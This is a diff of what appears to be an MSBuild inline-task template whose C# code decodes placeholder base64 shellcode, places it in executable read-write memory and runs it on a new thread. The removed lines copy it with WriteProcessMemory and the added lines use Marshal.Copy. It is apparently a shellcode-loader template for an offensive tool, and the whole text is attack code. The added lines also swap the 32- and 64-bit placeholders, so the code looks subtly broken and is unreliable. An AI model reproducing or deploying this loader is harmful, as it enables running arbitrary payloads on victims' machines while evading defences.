@@ -20,15 +20,13 @@ private static UInt32 MEM_COMMIT = 0x1000;private static UInt32 PAGE_EXECUTE_REA
 public override bool Execute()
 {
 string pw = "#REPLACEMERANDSTRING#";
-string sc32 = "#REPLACEME32#";
-string sc64 = "#REPLACEME64#";
-byte[] sc = null;
-if (IntPtr.Size == 4){sc = System.Convert.FromBase64String(sc32);} else {sc = System.Convert.FromBase64String(sc64);}
-IntPtr funcAddr = VirtualAlloc(0, (UInt32)sc.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
-Process t = Process.GetProcessById(Process.GetCurrentProcess().Id);IntPtr bw = IntPtr.Zero;
-bool resultBool = WriteProcessMemory(t.Handle,funcAddr,sc,sc.Length, out bw);
-IntPtr hThread = IntPtr.Zero;UInt32 threadId = 0;hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);WaitForSingleObject(hThread, 0xFFFFFFFF);
-return true;}}
+string shell64 = "#REPLACEME32#";
+string shell32 = "#REPLACEME64#";
+byte[] shellcode = null;
+if (IntPtr.Size == 4){shellcode = System.Convert.FromBase64String(shell32);} else {shellcode = System.Convert.FromBase64String(shell64);}
+IntPtr funcAddr = VirtualAlloc(0, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
+Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+IntPtr hThread = IntPtr.Zero;uint threadId = 0;IntPtr pinfo = IntPtr.Zero;hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);WaitForSingleObject(hThread, 0xFFFFFFFF);return true;}}
  ]]>
  </Code>
  </Task>
